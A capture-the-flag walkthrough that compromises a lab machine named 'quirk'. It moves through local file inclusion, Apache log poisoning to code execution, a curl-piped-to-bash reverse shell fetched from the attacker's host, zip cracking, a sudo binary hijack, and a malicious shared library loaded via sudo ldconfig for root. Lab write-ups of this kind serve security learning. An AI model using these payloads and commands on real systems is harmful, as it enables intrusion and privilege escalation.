# Note: Add quirk.htb in /etc/hosts
Initial enumuration
Scanning with nmap, we have 2 ports open ssh on port 22 and http on port 80

```nmap
nmap -F 192.168.18.50
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 07:59 EDT
Nmap scan report for 192.168.18.50
Host is up (0.00054s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds

```

script scan and service version to find any outdated softwares but everything is pretty up to date

```nmap
nmap -sC -sV -p22,80 192.168.18.50
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 07:59 EDT
Nmap scan report for 192.168.18.50
Host is up (0.00064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:cc:f5:e8:08:b0:ca:01:20:34:3d:01:84:eb:be:d6 (RSA)
|   256 11:26:56:fe:68:c8:d4:d4:fe:8b:f8:ef:ff:4c:0f:d1 (ECDSA)
|_  256 10:0e:9e:91:8f:57:cd:a2:75:c7:16:ff:0d:13:cd:0e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: quirk login page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds

```

Http server running, opening in webbrowser we can see a login prompt

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/1.PNG)

But it's a static page so the login goes nowhere. So i ran a gobutser 
`gobuster dir -u http://quirk.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`
we get some results few directory for static site & one interesting file `readme.php` 

```YAML
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://quirk.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/19 08:11:24 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 307] [--> http://quirk.thm/images/]
/css                  (Status: 301) [Size: 304] [--> http://quirk.thm/css/]   
/js                   (Status: 301) [Size: 303] [--> http://quirk.thm/js/]    
/vendor               (Status: 301) [Size: 307] [--> http://quirk.thm/vendor/]
/readme.php           (Status: 200) [Size: 78]                                
/fonts                (Status: 301) [Size: 306] [--> http://quirk.thm/fonts/] 
Progress: 19618 / 441122 (4.45%)                                             ^C
[!] Keyboard interrupt detected, terminating.
                                                                              
===============================================================
2021/08/19 08:11:28 Finished
===============================================================

```

readme.php gives the info 
`curl 192.168.18.50:80/readme.php `
## hey Aizawa we moved our development pages to a new vhost due to U.S.J Incident
We got a username aizawa, and this hint shows there is a vhost running in this machine.
so i ran a vhost scan.
Imediately we get vhost `beta.quirk.thm` which has 200 status code. so i added it in my hosts file.

```YAML
gobuster vhost -u http://quirk.thm/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://quirk.thm/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/08/19 08:19:22 Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.quirk.thm (Status: 200) [Size: 2208]
Found: gc._msdcs.quirk.thm (Status: 400) [Size: 422]

```

Opening the newly discovered vhost in webbrowser, redirect us to another different page.

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/2.PNG)

Site have 4 pages
```
1: Home
2: work
3: about me
4: contact 
```

clicking work page also shows home page

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/3.PNG)

checking about me. We have another username here todoroki

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/4.PNG)

checking contact me shows this page have an email section trying xss paylods didn't work 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/5.PNG)

When visiting work page it looks suspecious. It's shows home page also the url points to index.html local file

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/6.PNG)

So i changed the index.html to contact.html local file. luckily it shows contact.html

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/7.PNG)

Local file inclusion confirmed by /etc/passwd file.

```
curl http://beta.quirk.thm/works.php?url=../../../../etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
deku:x:1000:1000:deku:/home/deku:/bin/bash
bakugo:x:1001:1001::/home/bakugo:/bin/bash
todoroki:x:1002:1002::/home/todoroki:/bin/bash
uraraka:x:1003:1003::/home/uraraka:/bin/bash
```

Aizawa user not present but todoroki presents in the machine
using lfi got the source code of works.php

```bash
curl http://beta.quirk.thm/works.php?url=works.php
```

```php
<?php
  $file = file_get_contents($_GET['url']);
  echo $file;

?>

```

It doesn't using any filtering for input. using php wrappers caused lfi
we have a readme.php in main domain. so i try to get the source code of readme.php but fails so the readme.php isn't present in that directory

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/8.PNG)

Using LFI to find the config files of apache shows the document root for main domain.

```bash
curl http://beta.quirk.thm/works.php?url=../../../../etc/apache2/sites-available/000-default.conf

<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@quirk.thm
        ServerName quirk.thm
        DocumentRoot /var/www/html/login

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

Document root is at `/var/www/html/login` . using this info we can get the source code of readme.php 

```php
url http://beta.quirk.thm/works.php?url=../../../../var/www/html/login/readme.php

<?php
echo "hey Aizawa we moved our development pages to a new vhost due to U.S.J Incident";
// I hope you read this ka.boom.quirk.thm

?>

```

Source code contains a comment which gives another vhost `ka.boom.quirk.thm` so add them in etc hosts. 
visiting the vhost gives simple page shows alpha testing file. clicking it shows working

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/9.PNG)
![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/10.PNG)

alpha.php using file=test seems like another LFI. so test it out 

```bash
curl http://ka.boom.quirk.thm/alpha.php?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<snip>--------------------------------
```

This time we cant get the source code like we previosly did, request the server to convert the source code to base64 then decoding it we can get the source code of the file. 

```php
┌──(ajay㉿0xAnnLynn)-[~/Quirk]
└─$ curl http://ka.boom.quirk.thm/alpha.php?file=alpha.php
┌──(ajay㉿0xAnnLynn)-[~/Quirk]
└─$ curl http://ka.boom.quirk.thm/alpha.php?file=php://filter/convert.base64-encode/resource=alpha.php | base64 -d 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   188  100   188    0     0  37600      0 --:--:-- --:--:-- --:--:-- 37600
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.html");
   }
   ?>

```

Yikes its using include obviously LFI and there is no filters. 

# LFI to RCE

Well be using apache log poisoning. To get code execution capture the request in burpsuite and send them to repeater. read the apache access.log.

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/12.PNG)

replace useragent with out php payload. which will poison the log file. Then send the request

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/13.PNG)

We can append `&` with log file to execute the php script. passing whoami to the input we get result www-data successfully got code execution. 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/14.PNG)

Created a revershell payload in local machine & used python server to transfer the payload to quirk machine and executed it. 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/15.PNG)

Executing the curl to download our payload and pipe it to bash gives us reverse shell.

`http://ka.boom.quirk.thm/alpha.php?file=/var/log/apache2/access.log&cmd=curl%20192.168.18.42:8000/rev.sh|bash`

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/16.PNG)

Stabilized shell 

```bash
┌──(ajay㉿0xAnnLynn)-[~/CTF/Quirk]
└─$ nc -lnvp 1234                                                                                          
Listening on 0.0.0.0 1234
Connection received on 192.168.18.50 42246
bash: cannot set terminal process group (1179): Inappropriate ioctl for device
bash: no job control in this shell
www-data@quirk:/var/www/ka_boom$ which python; which python3 
which python; which python3 
/usr/bin/python3
www-data@quirk:/var/www/ka_boom$  python3 -c 'import pty; pty.spawn("/bin/bash")'
<m$  python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@quirk:/var/www/ka_boom$ ^Z
[1]+  Stopped                 nc -lnvp 1234
┌──(ajay㉿0xAnnLynn)-[~/CTF/Quirk]
└─$ stty raw -echo; fg
nc -lnvp 1234

www-data@quirk:/var/www/ka_boom$ export TERM=xterm
www-data@quirk:/var/www/ka_boom$ 

```

# www-data to user
bakup.zip file is present in `/var/www` so i transfered it to my local machine. 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/17.PNG)

bakup.zip file is password protected, we need to crack it first. 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/18.PNG)

using zip2john to get the hash and cracked the hash with johntheripper. 
`zip2john bakup.zip > zip.hash.txt`

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/19.PNG)

we cracked the password but the backup file isn't interesting it contains the backup for the webpages. the password is used for other others. Testing with every users we can switch to bakugo password reused

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/20.PNG)

user.txt is not present in bakugo home directory so we need to privesc to another user.
sudo -l gives we can run /opt/checks as user deku. 

```bash
bakugo@quirk:~$ ls 
bakugo@quirk:~$ sudo -l 
Matching Defaults entries for bakugo on quirk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bakugo may run the following commands on quirk:
    (deku) NOPASSWD: /opt/checks
bakugo@quirk:~$ ls -la /opt/checks 
-rwxr-xr-x 1 root root 16696 Aug 18 06:54 /opt/checks

```
/opt/checks owned by root we cant edit it but we can execute it and executing the script it expects a file explosion from bakugo home directory which didn't present 

```bash
bakugo@quirk:~$ /opt/checks 
sh: 1: /home/bakugo/explosion: not found
bakugo@quirk:~$ 
```

checking strings on binary we can see it's using system and our explosion i transfered the binary to my local machine for further analysis.

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/21.PNG)

we can import it to ghidra to find what its doing. it have only one function main

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/22.PNG)

## pseudo code from ghidra

```C

undefined8 main(void)

{
  system("/home/bakugo/explosion");
  return 0;
}

```

Exploitation is straight forward it executing explosion as deku user from bakugo home folder. we can place our malicious explosion binary to escalate from bakugo to deku
copied the bash to bakugo home folder and renamed to explosion then executing /opt/checks run bash as deku

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/23.PNG)

We escalated our privileges to user deku. but we can't view flag it don't have permission but thats not an issues we owned the file so we can change permission.

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/24.PNG)

# deku to root

A SUID binary present in deku home directory. when i check knife in gtfo bins we have a result 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/25.PNG)

When executing it we didn't get shell 

```bash
deku@quirk:/home/deku$ ./knife exec -E 'exec "/bin/sh"'
lol nope
deku@quirk:/home/deku$ 

```

running the binary without any arguments is suggest to use `--shell` but which is also says `lol nope` seems this is the default behaviour of the binary

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/26.PNG)

Running strings to knife binary, we don't see any string like `lol nope` which is also not obfuscated.

```
deku@quirk:/home/deku$ strings knife 
/lib64/ld-linux-x86-64.so.2
libcustom.so
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
nope
_init
_fini
libc.so.6
puts
__cxa_finalize
__libc_start_main
_edata
__bss_start
_end
GLIBC_2.2.5
=I       
5B       
AWAVI
AUATL
[]A\A]A^A_
usage ./knife [options] 
Try: knife --shell 
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
knife.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
nope
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
deku@quirk:/home/deku$ 
```

Transferred to local machine and analyse with ghidra. 
This binary have only main mainfuntion

## pseudo code
```C

undefined8 main(int param_1)

{
  if (param_1 == 1) {
    puts("usage ./knife [options] ");
    puts("Try: knife --shell ");
  }
  else {
    nope();
  }
  return 0;
}

```

checking for argument if we didn't pass any argument it prints usage, if we pass any argument it goes to nope function. but nope function isn't present in the binary. Binary isn't stripped 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/27.PNG)
![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/28.PNG)

When running knife binary in local machine we get an error can't open shared object libcustom.so

```bash
┌──(ajay㉿0xAnnLynn)-[~/CTF/Quirk]
└─$ ./knife 
./knife: error while loading shared libraries: libcustom.so: cannot open shared object file: No such file or directory
┌──(ajay㉿0xAnnLynn)-[~/CTF/Quirk]
└─$ 
```

On quirk machine it have the custom libc for knife but we don't have in our local machine. 

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/29.PNG)

checking the permission of the libcustom.so it's  only writable by root.

```bash
deku@quirk:/home/deku$ ls -la /usr/lib/libcustom.so
-rwxr-xr-x 1 root root 7904 Aug 19 09:30 /usr/lib/libcustom.so
deku@quirk:/home/deku$ 

```

sudo -l shows we can run ldconfig as root without password

```
deku@quirk:/home/deku$ sudo -l 
Matching Defaults entries for deku on quirk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on quirk:
    (root) NOPASSWD: /sbin/ldconfig

```

according to man page of ldconfig

```
DESCRIPTION
       ldconfig creates the necessary links and cache to the most recent shared libraries found in the direc‐
       tories specified on the command line, in the file /etc/ld.so.conf, and  in  the  trusted  directories,
       /lib  and /usr/lib (on some 64-bit architectures such as x86-64, /lib and /usr/lib are the trusted di‐
       rectories for 32-bit libraries, while /lib64 and /usr/lib64 are used for 64-bit libraries).
```

checking /etc/ld.so.conf.d/ we have an entry for libcustom.so it loads from deku home folder.

```bash
deku@quirk:/home/deku$ ls /etc/ld.so.conf.d/
customlibc.conf  libc.conf  x86_64-linux-gnu.conf
deku@quirk:/home/deku$ cat /etc/ld.so.conf.d/customlibc.conf 
# cutomlibc default configuration
/home/deku
deku@quirk:/home/deku$ 

```

If we place a malicious libcustom.so in deku home directory then executing ldconfig loads our malicious library. 

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void nope(){
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```

compile with gcc to create a shared object file in deku home directory. This shared object file simply execute bash with root privileges. function name must be nope which is used in the knife binary.

```bash
deku@quirk:/home/deku$ ls
knife  shell.c  user.txt
deku@quirk:/home/deku$ gcc -shared -o libcustom.so -fPIC shell.c 
shell.c: In function ‘nope’:
shell.c:8:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
     system("/bin/sh");
     ^~~~~~
deku@quirk:/home/deku$ ls
knife  libcustom.so  shell.c  user.txt
deku@quirk:/home/deku$ 


```

executing ldconfig loads library from deku home directory confirm them by ldd.

![alt text](https://github.com/TamilHackz/THM-writeups/blob/main/images/31.PNG)

Executing knife with --shell it will loads our malicious library, knife is  a SUID binary so it spawns a beautiful root shell. 
